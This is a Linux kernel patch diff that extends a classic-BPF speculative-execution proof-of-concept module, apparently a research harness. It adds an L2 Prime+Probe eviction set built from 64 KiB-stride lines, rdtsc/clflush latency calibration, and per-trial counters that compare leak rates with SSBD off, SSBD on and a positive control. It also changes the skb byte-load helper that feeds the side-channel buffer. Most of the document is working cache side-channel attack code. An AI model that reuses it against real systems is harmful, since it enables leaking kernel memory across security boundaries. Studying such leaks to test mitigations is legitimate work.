@@ -155,6 +155,107 @@ static noinline void cbpf_poc_calibrate(void)
 	(void)s;
 }
 
+/* ---- In-kernel L2 Prime+Probe alongside the timing readout ------------------
+ * Measures whether *contention* (not timing) resolves the same transient SIG
+ * fill the Flush+Reload timing probe sees. Eviction set = CPOC_EV_WAYS lines at
+ * 64 KiB stride, congruent to the SIG line's L2 set. L2 is PIPT and unsliced:
+ * set index = PA[15:6], so a 64 KiB (2^16) stride keeps [15:6] fixed -> exact
+ * L2 congruence, no timing-based construction needed. Primed before the filter;
+ * per-line latencies are sampled after it, before the timing probe touches SIG.
+ * If contention sees the fill, the SSBD-off bucket should separate from the
+ * SSBD-on bucket and the positive-control bucket should fire. */
+#define CPOC_EV_ORDER  9
+#define CPOC_EV_BYTES  (1UL << (CPOC_EV_ORDER + PAGE_SHIFT))
+#define CPOC_EV_STRIDE 65536UL
+#define CPOC_EV_WAYS   22		/* ~L2 assoc (20): low baseline self-eviction */
+#define SIG_LINE (&cbpf_poc_buf[CBUF_SIG_PAGE * 4096 + CPOC_HDR])
+static u8 *cpoc_ev_base;
+static const volatile u8 *cpoc_ev[CPOC_EV_WAYS];
+static int cpoc_ev_n;
+static u64 cpoc_ev_thr;			/* per-line L2-hit vs L3-hit cutoff */
+static bool cbpf_poc_pp_poscontrol;	/* kernel fills SIG every call (pos. ctrl) */
+
+/* Per-trial P+P bucketed by CAUSE (not outcome): SSBD-off / SSBD-on / positive
+ * control. Each records how often the per-trial count of L3-demoted eviction
+ * lines reaches >=1/2/3. off-on = the P+P-detected transient rate (SSBD-on is
+ * the collapse control); poscontrol must read ~100% or the probe is broken. */
+struct pp_bucket { u64 n, ge1, ge2, ge3, csum; };
+static struct pp_bucket pp_off, pp_on, pp_pc;
+
+static void cbpf_poc_ev_init(void)
+{
+	struct page *pg;
+	unsigned long sig_pa, base_pa, want_off;
+	int i;
+
+	pg = alloc_pages(GFP_KERNEL, CPOC_EV_ORDER);
+	if (!pg) { pr_warn("cbpf_poc: eviction buffer alloc failed\n"); return; }
+	cpoc_ev_base = page_address(pg);
+	memset(cpoc_ev_base, 0x33, CPOC_EV_BYTES);
+	sig_pa  = __pa(SIG_LINE);
+	base_pa = __pa(cpoc_ev_base);
+	want_off = (sig_pa - base_pa) & (CPOC_EV_STRIDE - 1);
+	for (i = 0; i < CPOC_EV_WAYS; i++) {
+		unsigned long off = want_off + (unsigned long)i * CPOC_EV_STRIDE;
+		if (off + 64 > CPOC_EV_BYTES) break;
+		cpoc_ev[i] = cpoc_ev_base + off;
+	}
+	cpoc_ev_n = i;
+	pr_info("cbpf_poc: L2 evset ways=%d sig_pa=%lx base_pa=%lx off=%lx\n",
+		cpoc_ev_n, sig_pa, base_pa, want_off);
+}
+
+static void cbpf_poc_prime_ev(void)
+{
+	int i, r; u8 s = 0;
+	if (!cpoc_ev_n) return;
+	for (r = 0; r < 2; r++)
+		for (i = 0; i < cpoc_ev_n; i++) s += *cpoc_ev[i];
+	(void)s;
+}
+
+/* Count eviction-set lines whose latency exceeds the L2/L3 cutoff (i.e. demoted
+ * out of L2). A single victim SIG fill evicts exactly one congruent line -> +1. */
+static int cbpf_poc_probe_ev(void)
+{
+	u64 t0, d; int i, cnt = 0; u8 s = 0;
+	for (i = 0; i < cpoc_ev_n; i++) {
+		t0 = rdtsc_ordered(); s = *cpoc_ev[i]; d = rdtsc_ordered() - t0;
+		if (d > cpoc_ev_thr) cnt++;
+	}
+	(void)s; return cnt;
+}
+
+/* Calibrate the eviction-set L2-hit vs L3-hit cutoff. L2-hit: prime, time a
+ * primed line (resident). L3-hit: touch SIG, prime (evicts SIG to L3), time SIG. */
+static noinline void cbpf_poc_ev_calibrate(void)
+{
+	const volatile u8 *sig = SIG_LINE;
+	unsigned long flags;
+	u64 t0, d, l2 = ~0ULL, l3 = ~0ULL;
+	u8 s = 0;
+	int i;
+
+	if (!cpoc_ev_n) return;
+	local_irq_save(flags);
+	for (i = 0; i < 128; i++) {
+		cbpf_poc_prime_ev();
+		t0 = rdtsc_ordered(); s = *cpoc_ev[0]; d = rdtsc_ordered() - t0;
+		if (d < l2) l2 = d;
+	}
+	for (i = 0; i < 128; i++) {
+		asm volatile("clflush %0" :: "m"(*sig) : "memory"); mb();
+		s += *sig;			/* SIG into L1/L2 */
+		cbpf_poc_prime_ev();		/* evicts SIG (congruent) to L3 */
+		t0 = rdtsc_ordered(); s = *sig; d = rdtsc_ordered() - t0;
+		if (d < l3) l3 = d;
+	}
+	local_irq_restore(flags);
+	cpoc_ev_thr = (l3 > l2) ? l2 + (l3 - l2) / 2 : l2 + 20;
+	pr_info("cbpf_poc: ev_thr=%llu (l2hit=%llu l3hit=%llu)\n", cpoc_ev_thr, l2, l3);
+	(void)s;
+}
+
 /* Flush the probed synthetic lines before the filter and time them after it. */
 static u64 cbuf_n, cbuf_warm, cbuf_arch_warm, cbuf_cold_warm, cbuf_lt_cold;
 static u64 cbuf_sig_sum, cbuf_arch_sum, cbuf_cold_sum;
@@ -165,6 +266,7 @@ static void cbpf_poc_flush_buf(void)
 	asm volatile("clflush %0" :: "m"(cbpf_poc_buf[CBUF_SIG_PAGE  * 4096 + CPOC_HDR]) : "memory");
 	asm volatile("clflush %0" :: "m"(cbpf_poc_buf[CBUF_COLD_PAGE * 4096 + CPOC_HDR]) : "memory");
 	mb();
+	cbpf_poc_prime_ev();	/* prime the L2 eviction set (evicts SIG from L2) */
 }
 
 static noinline void cbpf_poc_probe_buf(void)
@@ -174,12 +276,26 @@ static noinline void cbpf_poc_probe_buf(void)
 	const volatile u8 *pc = &cbpf_poc_buf[CBUF_COLD_PAGE * 4096 + CPOC_HDR];
 	unsigned long flags;
 	u64 t0, la, ls, lc, thr;
+	int pp = 0;
 	u8 sink;
 
 	if (!cpoc_calibrated)
 		return;				/* need the fixed threshold first */
 
 	local_irq_save(flags);
+	/* Positive control (zero-churn probe test): fill SIG right before probing,
+	 * so exactly one congruent eviction-set line is freshly demoted with no
+	 * intervening activity. If the probe still misses it, the threshold/probe
+	 * is broken (not churn). This isolates probe quality from filter churn. */
+	if (cbpf_poc_pp_poscontrol) {
+		u8 s = *(const volatile u8 *)SIG_LINE;
+		asm volatile("" :: "r"(s) : "memory");
+	}
+	/* P+P probe FIRST, before we touch SIG for the timing probe: count the
+	 * eviction-set lines demoted out of L2. A transient SIG fill during the
+	 * filter evicted one congruent line -> +1. */
+	if (cpoc_ev_n)
+		pp = cbpf_poc_probe_ev();
 	asm volatile("clflush %0" :: "m"(*pc) : "memory"); mb();
 	t0 = rdtsc_ordered(); sink = *ps; ls = rdtsc_ordered() - t0;
 	t0 = rdtsc_ordered(); sink = *pa; la = rdtsc_ordered() - t0;
@@ -194,6 +310,16 @@ static noinline void cbpf_poc_probe_buf(void)
 	if (la <= thr) cbuf_arch_warm++;
 	if (lc <= thr) cbuf_cold_warm++;
 	if (ls <  lc)  cbuf_lt_cold++;
+	/* Bucket the per-trial P+P count by CAUSE: positive control / SSBD-on /
+	 * SSBD-off. off-on = the P+P-detected transient rate. */
+	if (cpoc_ev_n) {
+		struct pp_bucket *b = cbpf_poc_pp_poscontrol ? &pp_pc :
+				      (cbpf_poc_ssbd_filter ? &pp_on : &pp_off);
+		b->n++; b->csum += pp;
+		if (pp >= 1) b->ge1++;
+		if (pp >= 2) b->ge2++;
+		if (pp >= 3) b->ge3++;
+	}
 }
 
 static int cbpf_poc_show(struct seq_file *m, void *v)
@@ -213,6 +339,22 @@ static int cbpf_poc_show(struct seq_file *m, void *v)
 		   cbuf_sig_sum / bn, cbuf_arch_sum / bn, cbuf_cold_sum / bn);
 	seq_printf(m, "buf_sum=%llu arch_sum=%llu cold_sum=%llu\n",
 		   cbuf_sig_sum, cbuf_arch_sum, cbuf_cold_sum);
+	seq_printf(m, "pp ev_ways=%d ev_thr=%llu\n", cpoc_ev_n, cpoc_ev_thr);
+	seq_printf(m, "pp OFF  n=%llu ge1=%llu(%llu.%02llu%%) ge2=%llu ge3=%llu cnt_avg_milli=%llu\n",
+		   pp_off.n, pp_off.ge1,
+		   pp_off.n ? pp_off.ge1 * 100 / pp_off.n : 0,
+		   pp_off.n ? (pp_off.ge1 * 10000 / pp_off.n) % 100 : 0,
+		   pp_off.ge2, pp_off.ge3, pp_off.n ? pp_off.csum * 1000 / pp_off.n : 0);
+	seq_printf(m, "pp ON   n=%llu ge1=%llu(%llu.%02llu%%) ge2=%llu ge3=%llu cnt_avg_milli=%llu\n",
+		   pp_on.n, pp_on.ge1,
+		   pp_on.n ? pp_on.ge1 * 100 / pp_on.n : 0,
+		   pp_on.n ? (pp_on.ge1 * 10000 / pp_on.n) % 100 : 0,
+		   pp_on.ge2, pp_on.ge3, pp_on.n ? pp_on.csum * 1000 / pp_on.n : 0);
+	seq_printf(m, "pp POSC n=%llu ge1=%llu(%llu.%02llu%%) ge2=%llu ge3=%llu cnt_avg_milli=%llu\n",
+		   pp_pc.n, pp_pc.ge1,
+		   pp_pc.n ? pp_pc.ge1 * 100 / pp_pc.n : 0,
+		   pp_pc.n ? (pp_pc.ge1 * 10000 / pp_pc.n) % 100 : 0,
+		   pp_pc.ge2, pp_pc.ge3, pp_pc.n ? pp_pc.csum * 1000 / pp_pc.n : 0);
 	return 0;
 }
 
@@ -247,6 +389,10 @@ static ssize_t cbpf_poc_write(struct file *f, const char __user *u,
 		cbpf_poc_ssbd_filter = true;	/* SSBD around the filter (mitigation) */
 	} else if (c == 'r') {
 		cbpf_poc_ssbd_filter = false;
+	} else if (c == 'P') {
+		cbpf_poc_pp_poscontrol = true;	/* P+P positive control on */
+	} else if (c == 'p') {
+		cbpf_poc_pp_poscontrol = false;
 	} else if (c == 'v') {
 		if (!kstrtouint(buf + 1, 16, &v) && v <= 0xff)
 			cbpf_poc_stale_value = (u8)v;
@@ -272,7 +418,9 @@ static int __init cbpf_poc_init(void)
 	memset(cbpf_poc_buf, 0x55, sizeof(cbpf_poc_buf));  /* fault in -> reads hit RAM */
 	if (!proc_create("cbpf_poc", 0644, NULL, &cbpf_poc_pops))
 		pr_warn("cbpf_poc: failed to create /proc/cbpf_poc\n");
-	cbpf_poc_calibrate();	/* establish a usable threshold at boot */
+	cbpf_poc_ev_init();	/* build the L2 eviction set congruent to SIG */
+	cbpf_poc_calibrate();	/* establish a usable timing threshold at boot */
+	cbpf_poc_ev_calibrate();/* establish the L2/L3 eviction-count cutoff */
 	return 0;
 }
 late_initcall(cbpf_poc_init);
@@ -453,6 +601,13 @@ BPF_CALL_4(bpf_skb_load_helper_8, const struct sk_buff *, skb, const void *,
 	u8 tmp;
 	const int len = sizeof(tmp);
 
+	offset = bpf_skb_load_helper_convert_offset(skb, offset);
+	if (offset == INT_MIN)
+		return -EFAULT;
+
+	if (headlen - offset >= len)
+		return *(u8 *)(data + offset);
+
 #ifdef CONFIG_CBPF_KSTACK_POC
 	/* Custom side-channel buffer: a P[X] offset >= CBPF_POC_BUF_BASE is served
 	 * by a single direct array deref (the shallow fast path -- see the buffer
@@ -467,12 +622,6 @@ BPF_CALL_4(bpf_skb_load_helper_8, const struct sk_buff *, skb, const void *,
 	}
 #endif
 
-	offset = bpf_skb_load_helper_convert_offset(skb, offset);
-	if (offset == INT_MIN)
-		return -EFAULT;
-
-	if (headlen - offset >= len)
-		return *(u8 *)(data + offset);
 	if (!skb_copy_bits(skb, offset, &tmp, sizeof(tmp)))
 		return tmp;
 	else
